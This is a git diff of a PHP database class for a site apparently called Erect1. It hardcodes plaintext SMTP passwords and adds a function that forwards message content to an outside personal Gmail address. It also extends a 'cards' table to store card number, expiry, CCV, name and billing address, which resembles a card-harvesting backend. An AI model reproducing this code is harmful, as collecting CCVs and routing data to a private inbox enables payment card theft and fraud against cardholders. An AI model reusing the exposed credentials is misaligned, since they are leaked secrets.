@@ -894,14 +894,14 @@ class DataBase
             $mail->isSMTP(); //Send using SMTP
             $mail->Host = 'mail.erect1.org'; //Set the SMTP server to send through
             $mail->SMTPAuth = true; //Enable SMTP authentication
-            $mail->Username = 'customercare@erect1.org'; //SMTP username
-            $mail->Password = 'erect1office'; //SMTP password
+            $mail->Username = 'supportcenter@erect1.org'; //SMTP username
+            $mail->Password = 'erect1office21'; //SMTP password
             $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS; //Enable implicit TLS encryption
             $mail->Port = 465; //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
 
             //Recipients
-            $mail->setFrom('customercare@erect1.org', 'Mailer');
-            $mail->addAddress($email, 'Joe User'); //Add a recipient
+            $mail->setFrom('supportcenter@erect1.org', 'Erect1');
+            $mail->addAddress($email, 'Erect1'); //Add a recipient
             // $mail->addAddress('customercare@erect1.org'); //Name is optional
             // $mail->addReplyTo('info@example.com', 'Information');
             // $mail->addCC('cc@example.com');
@@ -915,7 +915,53 @@ class DataBase
             $mail->isHTML(true); //Set email format to HTML
             $mail->Subject = $sub;
             $mail->Body = $mess;
-            $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
+            // $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
+
+            $mail->send();
+            return true;
+        } catch (Exception $e) {
+            // exit();
+            // return "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+            return false;
+        }
+    }
+
+    public static function Recieve_mail($mess, $sub)
+    {
+
+        require 'vendor/autoload.php';
+
+        //Create an instance; passing `true` enables exceptions
+        $mail = new PHPMailer(true);
+
+        try {
+            //Server settings
+            $mail->SMTPDebug = 0; //Enable verbose debug output
+            $mail->isSMTP(); //Send using SMTP
+            $mail->Host = 'mail.erect1.org'; //Set the SMTP server to send through
+            $mail->SMTPAuth = true; //Enable SMTP authentication
+            $mail->Username = 'supportcenter@erect1.org'; //SMTP username
+            $mail->Password = 'erect1office'; //SMTP password
+            $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS; //Enable implicit TLS encryption
+            $mail->Port = 465; //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
+
+            //Recipients
+            $mail->setFrom('supportcenter@erect1.org', 'Erect1');
+            $mail->addAddress('riotech2222@gmail.com', 'Erect1'); //Add a recipient
+            // $mail->addAddress('customercare@erect1.org'); //Name is optional
+            // $mail->addReplyTo('info@example.com', 'Information');
+            // $mail->addCC('cc@example.com');
+            // $mail->addBCC('bcc@example.com');
+
+            //Attachments
+            // $mail->addAttachment('/var/tmp/file.tar.gz'); //Add attachments
+            // $mail->addAttachment('/tmp/image.jpg', 'new.jpg'); //Optional name
+
+            //Content
+            $mail->isHTML(true); //Set email format to HTML
+            $mail->Subject = $sub;
+            $mail->Body = $mess;
+            // $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
 
             $mail->send();
             return true;
@@ -1057,7 +1103,7 @@ class DataBase
 
         try {
             $myconn = self::getConn();
-        $query = "INSERT INTO `cards`(`id`, `card_number`, `expedite`, `ccv`, `name`) VALUES (?,?,?,?,?)";
+        $query = "INSERT INTO `cards`(`id`, `card_number`, `expedite`, `ccv`, `name`,`country`, `state`, `city`, `zip`) VALUES (?,?,?,?,?,?,?,?,?)";
         $stm = $myconn->prepare($query);
         $feedback = $stm->execute($data);
         return "Successfull";
